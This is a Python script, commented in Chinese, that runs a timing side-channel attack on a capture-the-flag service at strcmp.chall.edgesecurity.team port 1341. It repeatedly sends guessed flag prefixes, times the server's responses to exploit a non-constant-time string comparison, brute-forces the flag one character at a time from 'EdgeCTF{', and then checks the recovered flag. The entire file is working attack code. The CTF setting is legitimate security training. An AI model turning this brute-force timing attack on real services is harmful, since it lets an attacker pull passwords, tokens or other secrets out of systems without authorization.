#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
strcmp(flag) 改进版时间侧信道攻击脚本
增加测量精度和样本数量
"""

import socket
import time
import string
import statistics
from collections import defaultdict

def connect_to_server():
    """连接到远程服务器"""
    host = "strcmp.chall.edgesecurity.team"
    port = 1341
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        return sock
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        return None

def measure_response_time_precise(test_string, num_samples=10):
    """更精确地测量响应时间"""
    times = []
    successful_measurements = 0
    
    for attempt in range(num_samples * 2):  # 允许一些失败的尝试
        if successful_measurements >= num_samples:
            break
            
        sock = connect_to_server()
        if not sock:
            continue
            
        try:
            # 清理初始状态
            sock.settimeout(0.5)
            try:
                initial = sock.recv(4096)
            except socket.timeout:
                pass
            
            # 准备发送数据
            data = (test_string + "\n").encode('utf-8')
            
            # 使用更精确的时间测量
            start_time = time.perf_counter()
            sock.send(data)
            
            try:
                sock.settimeout(2.0)
                response = sock.recv(4096)
            except socket.timeout:
                response = b""
            
            end_time = time.perf_counter()
            elapsed = end_time - start_time
            times.append(elapsed)
            successful_measurements += 1
            
        except Exception as e:
            continue
        finally:
            sock.close()
        
        # 短暂等待避免过于频繁
        time.sleep(0.05)
    
    if times:
        # 移除异常值
        if len(times) >= 3:
            times_sorted = sorted(times)
            # 去掉最高和最低值
            times = times_sorted[1:-1]
        
        avg_time = statistics.mean(times)
        std_dev = statistics.stdev(times) if len(times) > 1 else 0
        return avg_time, std_dev
    return 0, 0

def test_timing_difference():
    """测试时间差异的可检测性"""
    print("=== 测试时间差异可检测性 ===")
    
    test_cases = [
        ("", "空字符串"),
        ("E", "第1个字符正确"),
        ("Ed", "前2个字符正确"), 
        ("Edg", "前3个字符正确"),
        ("Edge", "前4个字符正确"),
        ("EdgeC", "前5个字符正确"),
        ("EdgeCT", "前6个字符正确"),
        ("EdgeCTF", "前7个字符正确"),
        ("EdgeCTF{", "前8个字符正确"),
        ("WrongCTF{", "错误前缀"),
        ("X" * 9, "完全错误"),
    ]
    
    results = {}
    
    for test_str, desc in test_cases:
        print(f"测试: '{test_str}' ({desc})")
        avg_time, std_dev = measure_response_time_precise(test_str, num_samples=15)
        results[test_str] = (avg_time, std_dev)
        print(f"  平均时间: {avg_time:.6f}s (±{std_dev:.6f}s)")
        print()
    
    # 分析结果
    print("=== 分析结果 ===")
    sorted_results = sorted(results.items(), key=lambda x: x[1][0], reverse=True)
    
    print("按平均响应时间排序:")
    for i, (test_str, (avg_time, std_dev)) in enumerate(sorted_results, 1):
        print(f"{i}. '{test_str}': {avg_time:.6f}s (±{std_dev:.6f}s)")
    
    return results

def advanced_timing_attack():
    """改进的时间侧信道攻击"""
    print("\n=== 改进的时间侧信道攻击 ===")
    
    known_prefix = "EdgeCTF{"
    current_flag = known_prefix
    
    # 只使用最常见的字符来加快速度
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-"
    
    print(f"从 '{current_flag}' 开始爆破...")
    
    max_length = 40
    no_improvement_count = 0
    
    for pos in range(len(current_flag), max_length):
        print(f"\n正在爆破位置 {pos} (当前: '{current_flag}')")
        
        char_results = {}
        
        # 测试每个字符
        for i, char in enumerate(charset):
            test_string = current_flag + char
            avg_time, std_dev = measure_response_time_precise(test_string, num_samples=8)
            char_results[char] = (avg_time, std_dev)
            
            # 实时显示进度
            progress = (i + 1) / len(charset) * 100
            print(f"  进度: {progress:.1f}% - '{char}': {avg_time:.6f}s", end="\r")
        
        print()  # 换行
        
        # 分析结果
        sorted_chars = sorted(char_results.items(), key=lambda x: x[1][0], reverse=True)
        
        print("前5个候选:")
        for i, (char, (avg_time, std_dev)) in enumerate(sorted_chars[:5], 1):
            print(f"  {i}. '{char}': {avg_time:.6f}s (±{std_dev:.6f}s)")
        
        # 选择最佳字符
        best_char = sorted_chars[0][0]
        best_time, best_std = sorted_chars[0][1]
        second_best_time = sorted_chars[1][1][0] if len(sorted_chars) > 1 else 0
        
        # 检查时间差异是否显著
        time_difference = best_time - second_best_time
        print(f"  时间差异: {time_difference:.6f}s")
        
        if time_difference < 0.0001:  # 如果时间差异很小
            print("  警告: 时间差异很小，可能不可靠")
            no_improvement_count += 1
        else:
            no_improvement_count = 0
        
        current_flag += best_char
        print(f"  选择: '{best_char}' -> 当前flag: '{current_flag}'")
        
        # 如果找到结束符或者连续多次没有明显改善
        if best_char == '}':
            print(f"\n找到可能的完整flag: {current_flag}")
            break
        elif no_improvement_count >= 5:
            print("\n连续多次没有明显时间差异，可能已经偏离正确路径")
            break
    
    return current_flag

def verify_flag_comprehensive(flag):
    """全面验证flag"""
    print(f"\n=== 全面验证flag: {flag} ===")
    
    # 测试完整flag
    correct_time, correct_std = measure_response_time_precise(flag, num_samples=20)
    print(f"完整flag '{flag}': {correct_time:.6f}s (±{correct_std:.6f}s)")
    
    # 测试几个变体
    variations = [
        flag[:-1] + "X",  # 最后一个字符错误
        flag[:-2] + "XX", # 最后两个字符错误
        "WrongCTF{" + flag[9:], # 前缀错误
        flag[:len(flag)//2] + "X" * (len(flag) - len(flag)//2), # 中间部分错误
    ]
    
    for variant in variations:
        if len(variant) > 0:
            var_time, var_std = measure_response_time_precise(variant, num_samples=10)
            time_diff = correct_time - var_time
            print(f"变体 '{variant[:20]}...': {var_time:.6f}s (差异: {time_diff:.6f}s)")
    
    return correct_time

if __name__ == "__main__":
    print("strcmp(flag) 改进版时间侧信道攻击")
    print("=" * 60)
    
    # 测试时间差异的可检测性
    timing_results = test_timing_difference()
    
    # 执行改进的攻击
    found_flag = advanced_timing_attack()
    
    # 全面验证结果
    if found_flag and len(found_flag) > 9:
        verify_flag_comprehensive(found_flag)
    
    print(f"\n最终结果: {found_flag}")